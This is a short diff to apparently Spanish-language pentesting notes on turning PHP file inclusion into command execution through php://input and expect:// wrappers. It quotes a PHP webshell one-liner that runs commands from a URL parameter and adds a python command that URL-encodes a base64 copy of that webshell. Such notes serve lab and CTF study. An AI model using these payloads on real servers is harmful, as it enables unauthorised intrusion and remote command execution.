@@ -160,4 +160,8 @@ echo '<?php system($_GET["cmd"]); ?>' | base64
 - `php://input` requiere que el parámetro vulnerable acepte POST; si solo acepta GET, no sirve.
 - Si la función usa solo `$_POST` (no `$_REQUEST`), meté el comando hardcodeado en el PHP: `<?php system('id'); ?>` en vez de webshell dinámica.
 - `expect://` está cargado en config ≠ funcional en runtime — siempre testealo con un `id`.
-- URL-encodear el payload base64: `=` → `%3D`, `+` → `%2B`.
+- URL-encodear el payload base64: = → `%3D`, `+` → `%2B`.
+
+___
+
+`python3 -c 'import urllib.parse;print(urllib.parse.quote_plus("PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg=="))'`
